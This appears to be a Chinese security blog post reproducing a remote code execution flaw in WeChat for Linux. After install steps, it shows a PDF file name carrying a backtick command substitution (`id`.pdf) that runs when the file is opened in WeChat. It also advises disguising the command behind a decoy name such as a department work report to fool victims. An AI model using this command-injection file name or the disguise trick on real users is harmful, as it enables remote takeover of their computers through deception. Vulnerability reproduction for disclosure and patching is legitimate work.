#  Wechat for Linux 最新RCE漏洞成功复现  
原创 flower
                    flower  flower安全   2026-02-10 07:48  
  
**0****1**  
  
漏洞简介  
  
  
Cybersecurity  
  
漏洞类型：RCE漏洞  
  
漏洞危害：高危  
  
影响版本：WeChat For Linux  
  
漏洞描述：可直接执行任意指令从而控制目标服务器  
  
复现情况：成功复现  
  
触发机制：未知  
  
  
  
**02**  
  
漏洞复现  
  
  
Cybersecurity  
  
（1）环境准备：  
  
下载WeChat For Linux：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CyYbk1vmHvZGVHraaBy6qQQXcBKomzxpMuargGknervSXk0U46BqPQFNWiaicUCNiaaJ4d8d15gh4s32No1RxrtN0tVYAibGv5lTYlqc4KnM6yQ/640?wx_fmt=png&from=appmsg "")  
  
  
安装字体：  
```
sudo apt-get install fonts-noto-cjk
```  
  
  
执行命令：  
```
sudo dpkg -i WeChatLinux_x86_64.deb
```  
  
（2）漏洞复现：  
  
制作PDF文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CyYbk1vmHvbaqr4GqWlboCwBI6COX9DQxCZsC4CjDX3qksUtvvQWIMGYpL5XYicupgbXvMia4cddp1ToibZIG2YFbb9ic24hXLdXWoq2FdIqEWw/640?wx_fmt=png&from=appmsg "")  
  
另存为PDF文件，并  
按以下命名规则命名PDF文件（可在实际命令前添加混淆文字实现对用户的欺骗）：  
```
`id`.pdf  ##在``写入需要执行的命令也可为 某某科室工作汇报文件``.pdf
```  
  
使用  
WeChat For Linux  
运行Pdf文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CyYbk1vmHvbrNw6ySEBVWQuvuxgTC2Qs3rNkMRX8CicZzT8RicoV3KMkEBlXL9LKoKlUS82Q989cSibibEJFeecE4vExCSqDDdIzrpoIVOBFn1g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CyYbk1vmHvZiariaV7Ick4kQKXEDqfVDmtgm6vU0jyr3SoWvSySN6YDKfTU2dcsciaeozS3NjJ5SDSNvu7vdguCiaKO5ptK4mqfKDtpULkEQbv8/640?wx_fmt=png&from=appmsg "")  
  
成功复现！  
  
  
  
